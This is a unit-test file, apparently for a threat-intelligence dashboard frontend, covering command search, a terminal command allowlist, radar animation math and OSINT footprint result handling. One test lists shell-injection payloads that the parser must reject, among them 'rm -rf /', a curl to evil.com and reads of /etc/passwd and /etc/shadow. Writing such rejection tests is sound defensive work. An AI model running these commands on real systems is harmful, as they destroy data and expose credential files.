// tests/unit/frontend.test.ts
// Unit tests for Frontend Logical Engines: Command Palette, Terminal Allowlist, Radar Physics, Footprint & Workspace

import { describe, it, expect } from 'vitest';
// @ts-expect-error JS module without declaration file
import { filterCommands, CommandPaletteController, DEFAULT_COMMANDS } from '../../public/js/components/command_palette.js';
// @ts-expect-error JS module without declaration file
import { parseTerminalCommand, TerminalHistory, SHELL_METACHARACTER_REGEX } from '../../public/js/components/terminal_console.js';
// @ts-expect-error JS module without declaration file
import { validateFootprintInput, classifyFootprintResponse, FOOTPRINT_STATUS } from '../../public/js/components/footprint_ui.js';
// @ts-expect-error JS module without declaration file
import { formatSha256Pill } from '../../public/js/components/case_workspace.js';
// @ts-expect-error JS module without declaration file
import { CYTOSCAPE_EDGE_STYLES } from '../../public/js/components/entity_graph.js';
// @ts-expect-error JS module without declaration file
import { NAVIGATION_MODULES } from '../../public/js/components/navigation_rail.js';

describe('Command Palette Search Engine', () => {
  it('should return top default items when query is empty', () => {
    const results = filterCommands('');
    expect(results.length).toBe(10);
    expect(results[0].category).toBeDefined();
  });

  it('should match navigation items by exact or partial title', () => {
    const results = filterCommands('Global Monitor');
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].title).toBe('Global Monitor');
    expect(results[0].route).toBe('/global-monitor');
  });

  it('should match items by keywords and acronyms', () => {
    const results = filterCommands('cve');
    expect(results.length).toBeGreaterThan(0);
    expect(results[0].title).toBe('Cyber Threats');
  });

  it('should be case-insensitive and trim input whitespace', () => {
    const resUpper = filterCommands('   TIMELINE   ');
    expect(resUpper.length).toBeGreaterThan(0);
    expect(resUpper[0].title).toBe('Timeline');
  });

  it('should handle circular selection traversal in controller', () => {
    const ctrl = new CommandPaletteController();
    ctrl.open();
    expect(ctrl.selectedIndex).toBe(0);

    ctrl.next();
    expect(ctrl.selectedIndex).toBe(1);

    ctrl.prev();
    expect(ctrl.selectedIndex).toBe(0);

    ctrl.prev();
    expect(ctrl.selectedIndex).toBe(ctrl.results.length - 1);
  });
});

describe('Terminal Console Allowlist & Security Parser', () => {
  it('should permit all safe allowlisted commands', () => {
    const safeCmds = [
      'help',
      'status',
      'sources',
      'cases list',
      'case show case-1234',
      'threats recent',
      'system health',
      'clear'
    ];

    for (const cmd of safeCmds) {
      const res = parseTerminalCommand(cmd);
      expect(res.valid, `Expected '${cmd}' to be valid`).toBe(true);
    }
  });

  it('should reject shell metacharacters and injection attempts', () => {
    const maliciousPayloads = [
      'cases list; rm -rf /',
      'status && curl evil.com',
      'help | cat /etc/passwd',
      '$(whoami)',
      '`id`',
      'system health > /tmp/out',
      '< /etc/shadow',
      'sources || ping -c 1 8.8.8.8'
    ];

    for (const payload of maliciousPayloads) {
      const res = parseTerminalCommand(payload);
      expect(res.valid, `Expected '${payload}' to be rejected`).toBe(false);
      expect(res.error).toContain('Illegal characters detected');
    }
  });

  it('should reject non-allowlisted commands', () => {
    const unauthorized = ['cat file.txt', 'ls -la', 'python script.py', 'reboot', 'sudo su'];
    for (const cmd of unauthorized) {
      const res = parseTerminalCommand(cmd);
      expect(res.valid).toBe(false);
      expect(res.error).toContain('is not recognized or not permitted');
    }
  });

  it('should enforce buffer length limits (>256 characters)', () => {
    const longCmd = 'status ' + 'a'.repeat(300);
    const res = parseTerminalCommand(longCmd);
    expect(res.valid).toBe(false);
    expect(res.error).toContain('exceeds maximum length');
  });

  it('should manage history buffer with duplicate suppression', () => {
    const hist = new TerminalHistory(5);
    hist.push('status');
    hist.push('status'); // Duplicate
    hist.push('sources');

    expect(hist.history).toEqual(['status', 'sources']);
    expect(hist.navigateUp('current')).toBe('sources');
    expect(hist.navigateUp()).toBe('status');
    expect(hist.navigateDown()).toBe('sources');
    expect(hist.navigateDown()).toBe('current');
  });
});

describe('Radar Sweep Canvas Physics & Telemetry', () => {
  it('should compute correct angular velocity for 15 RPM', () => {
    const rpm = 15;
    const degPerSec = (rpm * 360) / 60; // 90 deg/s
    expect(degPerSec).toBe(90);

    const period = 360 / degPerSec; // 4.0s
    expect(period).toBe(4.0);
  });

  it('should compute exact azimuth over elapsed time', () => {
    const degPerSec = 90;
    const getAzimuth = (elapsedSec: number, theta0 = 0) => (theta0 + elapsedSec * degPerSec) % 360;

    expect(getAzimuth(0)).toBe(0);
    expect(getAzimuth(1.0)).toBe(90);
    expect(getAzimuth(2.0)).toBe(180);
    expect(getAzimuth(4.0)).toBe(0);
    expect(getAzimuth(5.5)).toBe(135);
  });

  it('should model exponential phosphor decay reaching <5% in 2.5s', () => {
    const lambda = 1.8;
    const intensity = (dt: number) => Math.exp(-lambda * dt);

    expect(intensity(0)).toBe(1.0);
    expect(intensity(2.5)).toBeLessThan(0.05);
  });
});

describe('Footprint Confirmation & Negative Result Classification', () => {
  it('should validate inputs for target types', () => {
    expect(validateFootprintInput('DOMAIN', 'example.com').valid).toBe(true);
    expect(validateFootprintInput('DOMAIN', 'invalid domain').valid).toBe(false);
    expect(validateFootprintInput('IP', '198.51.100.1').valid).toBe(true);
    expect(validateFootprintInput('IP', '999.999.999.999').valid).toBe(false);
    expect(validateFootprintInput('EMAIL', 'analyst@domain.com').valid).toBe(true);
    expect(validateFootprintInput('USERNAME', 'threat_actor_1').valid).toBe(true);
  });

  it('should classify HTTP 200 with found: false as NEGATIVE_RESULT without retry', () => {
    const classification = classifyFootprintResponse(200, {
      success: true,
      found: false,
      records: []
    });

    expect(classification.status).toBe(FOOTPRINT_STATUS.NEGATIVE_RESULT);
    expect(classification.badgeText).toBe('NO RECORDS FOUND - 200 OK');
    expect(classification.badgeClass).toBe('badge-neutral');
    expect(classification.canRetry).toBe(false);
  });

  it('should classify HTTP 504 / 400 as UPSTREAM_FAILURE with retry', () => {
    const classification = classifyFootprintResponse(504, null, {
      code: 'GATEWAY_TIMEOUT',
      message: 'crt.sh upstream timed out after 10000ms'
    });

    expect(classification.status).toBe(FOOTPRINT_STATUS.UPSTREAM_FAILURE);
    expect(classification.badgeText).toContain('504');
    expect(classification.badgeClass).toBe('badge-danger');
    expect(classification.canRetry).toBe(true);
  });

  it('should classify HTTP 200 with records as SUCCESS with attach option', () => {
    const classification = classifyFootprintResponse(200, {
      success: true,
      found: true,
      records: [{ type: 'A_RECORD', value: '93.184.216.34' }],
      evidence_id: 'ev-1234'
    });

    expect(classification.status).toBe(FOOTPRINT_STATUS.SUCCESS);
    expect(classification.canAttach).toBe(true);
  });

  it('should format SHA-256 pills with truncated display', () => {
    const validHash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
    const pill = formatSha256Pill(validHash);
    expect(pill.short).toBe('e3b0c442...52b855');
    expect(pill.full).toBe(validHash);
  });
});

describe('Entity Graph Confidence & Navigation Rail Modules Contracts', () => {
  it('should match exact 3-tier Cytoscape edge styles', () => {
    expect(CYTOSCAPE_EDGE_STYLES.VERIFIED).toEqual({ lineStyle: 'solid', color: '#00E5FF', width: 2.5 });
    expect(CYTOSCAPE_EDGE_STYLES.INFERRED).toEqual({ lineStyle: 'dashed', color: '#FFA726', width: 2.0 });
    expect(CYTOSCAPE_EDGE_STYLES.HYPOTHESIS).toEqual({ lineStyle: 'dotted', color: '#D4AF37', width: 1.5 });
  });

  it('should declare all 15 navigation rail modules', () => {
    expect(NAVIGATION_MODULES.length).toBe(15);
    const ids = NAVIGATION_MODULES.map((m: { id: string }) => m.id);
    expect(ids).toContain('command-center');
    expect(ids).toContain('global-monitor');
    expect(ids).toContain('live-intel');
    expect(ids).toContain('cyber-threats');
    expect(ids).toContain('investigations');
    expect(ids).toContain('cases');
    expect(ids).toContain('entity-graph');
    expect(ids).toContain('timeline');
    expect(ids).toContain('ai-ops');
    expect(ids).toContain('watchlists');
    expect(ids).toContain('reports');
    expect(ids).toContain('data-sources');
    expect(ids).toContain('audit-logs');
    expect(ids).toContain('settings');
    expect(ids).toContain('system-health');
  });
});
